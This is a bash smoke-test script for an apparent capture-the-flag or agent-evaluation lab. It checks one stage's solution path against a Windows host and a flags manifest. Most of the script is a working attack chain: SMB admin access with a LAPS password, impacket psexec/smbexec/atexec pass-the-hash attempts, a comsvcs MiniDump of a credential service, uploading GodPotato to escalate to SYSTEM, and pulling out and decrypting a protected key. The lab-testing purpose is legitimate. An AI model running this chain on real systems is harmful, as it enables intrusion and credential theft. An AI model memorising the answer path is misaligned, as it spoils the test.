#!/usr/bin/env bash
# smoke_m6_credservice.sh -- standalone M6 smoke (operator-ws1) that
# requires the m5.s6 LAPS UUID as input (so it can run without re-walking
# the full M5 chain). Exercises:
#
#   [LAPS_AUTH]   local Administrator SMB auth via LAPS pwd
#   [M6.s1]       pull CredService.exe + strings -> ServiceTag UUID
#   [M6_NEGATIVE_PSEXEC]    impacket-psexec MUST FAIL with ACCESS_DENIED
#   [M6_NEGATIVE_SMBEXEC]   impacket-smbexec MUST FAIL with ACCESS_DENIED
#   [M6_NEGATIVE_ATEXEC]    impacket-atexec MUST FAIL with ACCESS_DENIED
#   [M6_NEGATIVE_MINIDUMP]  comsvcs MiniDump as Administrator MUST FAIL
#                           (SeDebug revoked) -- no key-from-memory shortcut
#   [M6.s2]       wmiexec + upload GodPotato + spawn SYSTEM cmd ->
#                 type key.bin; 16 bytes formatted as UUID
#   [M6.s3]       AES-GCM decrypt cipherblob (from m6.s1 binary) with
#                 m6.s2 key -> plaintext UUID
#
# Four NEGATIVE tests proving every non-token-impersonation PtH-to-SYSTEM
# path is blocked on operator-ws1 (SCM SDDL strip of SC_MANAGER_CREATE_
# SERVICE [KA/GA-aware], Task Scheduler ACL, SeDebug revoke); if any
# UNEXPECTEDLY succeeds, the m6.s2 token-imp gate is bypassable.
#
# Usage: bash smoke_m6_credservice.sh --laps <m5.s6 UUID> [--manifest /path] [--logdir DIR]

set -uo pipefail

WEB_HOST="operator-ws1.oscar.local"
WEB_IP="10.30.0.100"

LAPS=""
MANIFEST=""
LOGDIR="/tmp/smoke-m6-$$"
POTATO=""
CIPHERBLOB=""

while [ $# -gt 0 ]; do
    case "$1" in
        --laps)         LAPS="$2"; shift 2 ;;
        --manifest)     MANIFEST="$2"; shift 2 ;;
        --logdir)       LOGDIR="$2"; shift 2 ;;
        --potato)       POTATO="$2"; shift 2 ;;
        --cipherblob)   CIPHERBLOB="$2"; shift 2 ;;
        -h|--help)      sed -n '2,30p' "$0"; exit 0 ;;
        *) echo "unknown arg: $1"; exit 2 ;;
    esac
done

if [ -z "$LAPS" ]; then
    echo "ERROR: --laps <m5.s6 UUID> required" >&2; exit 2
fi
mkdir -p "$LOGDIR"
PASS=0; FAIL=0

c_red()   { printf '\033[31m%s\033[0m' "$*"; }
c_green() { printf '\033[32m%s\033[0m' "$*"; }
c_blue()  { printf '\033[34m%s\033[0m' "$*"; }
c_yellow(){ printf '\033[33m%s\033[0m' "$*"; }
section() { echo; echo "============================================================"; echo " [$(c_blue "$1")] $2"; echo "============================================================"; }
ok()    { echo "  $(c_green ok): $*";   PASS=$((PASS+1)); }
bad()   { echo "  $(c_red FAIL): $*";   FAIL=$((FAIL+1)); }
note()  { echo "  $(c_yellow note): $*"; }

# Retry a (network) command up to 3x with backoff. operator-ws1's SMB
# occasionally answers a single connect with NT_STATUS_IO_TIMEOUT; each
# smbclient/winrm step is retried independently (a partial success survives).
retry() {
    local n=1 max=3
    while true; do
        "$@" && return 0
        [ "$n" -ge "$max" ] && return 1
        n=$((n+1)); sleep 3
    done
}

manifest_uuid() {
    local id="$1"
    if [ -z "$MANIFEST" ]; then
        MANIFEST="$(dirname "$0")/../flags/manifest.yaml"
    fi
    python3 -c "
import sys, yaml
m = yaml.safe_load(open('$MANIFEST'))
for f in m['flags']:
    if f['id'] == '$id':
        print(f['uuid'])
        sys.exit(0)
sys.exit(1)
"
}
EXPECT_S1=$(manifest_uuid m6.s1)
EXPECT_S2=$(manifest_uuid m6.s2)
EXPECT_S3=$(manifest_uuid m6.s3)

# Default SeImpersonate->SYSTEM tool. GodPotato (DCOM/RPCSS) is the default
# because PrintSpoofer (Spooler named-pipe) is patched on operator-ws1's
# Win11 build 26100. Override with --potato /path/to/tool.exe.
if [ -z "$POTATO" ]; then
    POTATO="$(dirname "$0")/bin/GodPotato-NET4.exe"
fi
if [ ! -f "$POTATO" ]; then
    cat >&2 <<EOF
ERROR: SeImpersonate tool not found at $POTATO.
Get GodPotato-NET4.exe from https://github.com/BeichenDream/GodPotato/releases
(works on modern Windows where PrintSpoofer is patched). Place at
scripts/bin/GodPotato-NET4.exe, or pass --potato /path/to/tool.exe.
EOF
    exit 2
fi

# ====================================================================
# [LAPS_AUTH]
# ====================================================================
section LAPS_AUTH "smbclient //$WEB_IP/C\$ as Administrator (LAPS) -- confirm admin SMB"
# Confirm the full admin token by accessing C$ (admin-only) rather than
# nxc's "Pwn3d!" string, which is a false negative on Win11 build 26100
# (auth succeeds and C$ access works, but the Pwn3d! probe doesn't trip).
AUTH=""
for _ in 1 2 3; do
    AUTH=$(smbclient "//$WEB_IP/C\$" -U "Administrator%$LAPS" -c "ls" 2>&1)
    echo "$AUTH" | grep -qiE "Windows|Program Files" && break
    sleep 3
done
if echo "$AUTH" | grep -qiE "Windows|Program Files"; then
    ok "local Administrator admin SMB confirmed (C\$ accessible)"
else
    bad "local Admin SMB auth/admin failed: $(echo "$AUTH" | tail -3 | tr '\n' ' ')"
    echo "ABORTING (no admin entry to operator-ws1 -- check LAPS pwd / LATFP)"
    exit 1
fi

# ====================================================================
# [M6.s1]  pull binary, extract ServiceTag
# ====================================================================
section M6.s1 "pull CredService.exe; strings -> ServiceTag UUID"
retry smbclient "//$WEB_IP/c\$" -U "Administrator%$LAPS" -c "get \"Program Files\CredService\CredService.exe\" $LOGDIR/CredService.exe" 2>"$LOGDIR/smb_m6s1.log" || true
if [ ! -s "$LOGDIR/CredService.exe" ]; then
    bad "could not pull CredService.exe (check $LOGDIR/smb_m6s1.log)"
else
    note "pulled $(stat -c%s "$LOGDIR/CredService.exe") bytes"
    GOT_S1=$(strings -el "$LOGDIR/CredService.exe" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}" | head -1)
    if [ "$GOT_S1" = "$EXPECT_S1" ]; then
        ok "m6.s1 captured: $GOT_S1"
    else
        bad "m6.s1 expected $EXPECT_S1 got '$GOT_S1'"
    fi
fi

# ====================================================================
# [M6_NEGATIVE_PSEXEC]  PsExec must FAIL
# ====================================================================
# Build-agnostic verdict: a PtH-to-SYSTEM method is BYPASSED only if it
# actually reaches SYSTEM (whoami -> "nt authority\system", or smbexec's
# semi-interactive shell banner). Anything else == blocked. Avoids guessing
# per-build error strings (e.g. Win11 says "Unable to open SVCManager").
SYS_RE='nt authority.system'
section M6_NEGATIVE_PSEXEC "impacket-psexec MUST NOT reach SYSTEM (SCM CreateService blocked)"
PSE_OUT=$(timeout 35 impacket-psexec "Administrator:$LAPS@$WEB_IP" "cmd /c whoami" 2>&1 || true)
if echo "$PSE_OUT" | grep -qiE "$SYS_RE"; then
    bad "PSEXEC REACHED SYSTEM -- m6.s2 PtH gate bypassed: $(echo "$PSE_OUT" | grep -iE "$SYS_RE" | head -1)"
else
    ok "psexec blocked (no SYSTEM): $(echo "$PSE_OUT" | grep -iE 'SVCManager|denied|error' | head -1)"
fi

# ====================================================================
# [M6_NEGATIVE_SMBEXEC]
# ====================================================================
section M6_NEGATIVE_SMBEXEC "impacket-smbexec MUST NOT reach SYSTEM"
SMBE_OUT=$(timeout 30 impacket-smbexec "Administrator:$LAPS@$WEB_IP" 2>&1 <<<'whoami
exit' || true)
if echo "$SMBE_OUT" | grep -qiE "$SYS_RE|semi-interactive shell"; then
    bad "SMBEXEC reached SYSTEM -- m6.s2 PtH gate bypassed"
else
    ok "smbexec blocked (no SYSTEM)"
fi

# ====================================================================
# [M6_NEGATIVE_ATEXEC]
# ====================================================================
section M6_NEGATIVE_ATEXEC "impacket-atexec MUST NOT reach SYSTEM"
ATX_OUT=$(timeout 30 impacket-atexec "Administrator:$LAPS@$WEB_IP" 'cmd /c whoami' 2>&1 || true)
if echo "$ATX_OUT" | grep -qiE "$SYS_RE"; then
    bad "ATEXEC reached SYSTEM -- m6.s2 PtH gate bypassed (Tasks-folder ACL): $(echo "$ATX_OUT" | grep -iE "$SYS_RE" | head -1)"
else
    ok "atexec blocked (no SYSTEM)"
fi

# ====================================================================
# [M6_NEGATIVE_MINIDUMP]  comsvcs MiniDump of CredService as Admin MUST FAIL
# ====================================================================
# SeDebugPrivilege is revoked from Administrators (+ re-revoked at boot), so a
# local-Admin process cannot MiniDump CredService to lift the AES key from
# memory -- closing the shortcut that skips the SYSTEM-only key.bin ACL. Driven
# via wmiexec so the dump runs in a local-Admin context, NOT SYSTEM.
section M6_NEGATIVE_MINIDUMP "comsvcs MiniDump of CredService as Administrator MUST FAIL (SeDebug revoked)"
MD_CMD='powershell -c "$p=(Get-Process CredService -EA SilentlyContinue).Id; if(-not $p){\"NO_PROC\";exit}; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Windows\Temp\cs.dmp full; if(Test-Path C:\Windows\Temp\cs.dmp){\"DUMP_OK size=\"+(Get-Item C:\Windows\Temp\cs.dmp).Length}else{\"DUMP_FAILED\"}"'
MD_OUT=$(timeout 60 impacket-wmiexec "Administrator:$LAPS@$WEB_IP" "$MD_CMD" 2>&1 || true)
smbclient "//$WEB_IP/c\$" -U "Administrator%$LAPS" -c "del Windows\Temp\cs.dmp" 2>/dev/null || true
if echo "$MD_OUT" | grep -q "DUMP_OK"; then
    bad "MiniDump as Administrator SUCCEEDED -- SeDebug revoke broken; m6.s2 key-from-memory shortcut open: $(echo "$MD_OUT" | grep DUMP_OK | head -1)"
else
    ok "MiniDump as Administrator blocked (SeDebug revoked) -- no key-from-memory shortcut"
fi

# ====================================================================
# [M6.s2]  token impersonation via GodPotato (SeImpersonate -> SYSTEM)
# ====================================================================
section M6.s2 "winrm + GodPotato -> SYSTEM cmd -> type key.bin"
# Upload the SeImpersonate->SYSTEM tool via SMB (the LAPS RID-500 admin).
retry smbclient "//$WEB_IP/c\$" -U "Administrator%$LAPS" -c "put $POTATO Windows\Temp\gp.exe" 2>"$LOGDIR/upload_potato.log" || true
# Launch GodPotato over WinRM (NOT wmiexec): GodPotato's DCOM/RPCSS trigger
# fails under wmiexec's Win32_Process.Create context on Win11 26100, but
# works from a real WinRM shell. The WinRM process runs as the local Admin
# (SeImpersonatePrivilege); GodPotato steals a SYSTEM token and runs the
# command as SYSTEM, reading key.bin past its SYSTEM-only ACL. (PrintSpoofer's
# Spooler path is patched on this build.)
retry nxc winrm "$WEB_IP" -u Administrator -p "$LAPS" --local-auth \
    -x "C:\\Windows\\Temp\\gp.exe -cmd \"cmd /c type C:\\ProgramData\\CredService\\key.bin > C:\\Windows\\Temp\\k.bin\"" \
    > "$LOGDIR/godpotato_winrm.log" 2>&1 || true
sleep 2

# Pull the dropped key file
retry smbclient "//$WEB_IP/c\$" -U "Administrator%$LAPS" -c "get Windows\Temp\k.bin $LOGDIR/key.bin" 2>"$LOGDIR/download_key.log" || true
if [ ! -f "$LOGDIR/key.bin" ]; then
    bad "could not pull key.bin -- winrm/GodPotato chain failed (see $LOGDIR/godpotato_winrm.log)"
    echo "  winrm output: $(grep -iE 'SYSTEM|error|pwn' "$LOGDIR/godpotato_winrm.log" | head -3 | tr '\n' ' ')"
elif [ "$(stat -c%s "$LOGDIR/key.bin")" != "16" ]; then
    bad "key.bin is $(stat -c%s "$LOGDIR/key.bin") bytes, expected 16"
else
    GOT_S2=$(python3 -c "import uuid; print(str(uuid.UUID(bytes=open('$LOGDIR/key.bin','rb').read())))")
    if [ "$GOT_S2" = "$EXPECT_S2" ]; then
        ok "m6.s2 captured (token-imp -> SYSTEM read): $GOT_S2"
    else
        bad "m6.s2 expected $EXPECT_S2 got '$GOT_S2'"
    fi
fi

# ====================================================================
# [M6.s3]  locate cipherblob in CredService.exe + AES-GCM decrypt
# ====================================================================
# The cipherblob is a 64-byte AES-GCM constant (nonce(12)||ct||tag(16))
# embedded as a managed byte[] in CredService.exe (uncompressed single-
# file publish -> the bytes sit contiguously in the file). At this point
# the agent already holds the m6.s2 key, so the robust, size-independent
# method is a KEYED trial-decrypt: slide a 64-byte window over the binary
# and AES-GCM-decrypt each with the key -- the GCM auth tag verifies for
# exactly ONE window (the real blob), yielding the m6.s3 UUID. This is
# reliable regardless of binary size (~tens of seconds on ~70MB) and needs
# no pinned-blob oracle or entropy heuristic.
section M6.s3 "keyed trial-decrypt: scan CredService.exe for the AES-GCM blob, decrypt with m6.s2 key"
if [ ! -f "$LOGDIR/CredService.exe" ] || [ ! -s "$LOGDIR/key.bin" ]; then
    bad "m6.s3 -- missing m6.s1 binary or m6.s2 key"
else
    GOT_S3=$(python3 -c "
import sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
data = open('$LOGDIR/CredService.exe','rb').read()
key  = open('$LOGDIR/key.bin','rb').read()
gcm  = AESGCM(key); L = 64
for off in range(0, len(data) - L + 1):
    w = data[off:off+L]
    try:
        pt = gcm.decrypt(w[:12], w[12:], None)
    except Exception:
        continue
    if len(pt) == 36 and pt.count(b'-') == 4:
        print(pt.decode()); sys.exit(0)
sys.exit(1)
" 2>"$LOGDIR/decrypt.log")
    if [ "$GOT_S3" = "$EXPECT_S3" ]; then
        ok "m6.s3 captured (keyed trial-decrypt of CredService.exe): $GOT_S3"
    else
        bad "m6.s3 expected $EXPECT_S3 got '$GOT_S3' (see $LOGDIR/decrypt.log)"
    fi
fi

# ---- cleanup -- best-effort delete of uploaded tool + dropped key
smbclient "//$WEB_IP/c\$" -U "Administrator%$LAPS" -c "del Windows\Temp\gp.exe; del Windows\Temp\k.bin" 2>/dev/null || true

# ---- summary ----------------------------------------------------------
echo
echo "============================================================"
echo "  PASS: $PASS    FAIL: $FAIL"
echo "  logs: $LOGDIR"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
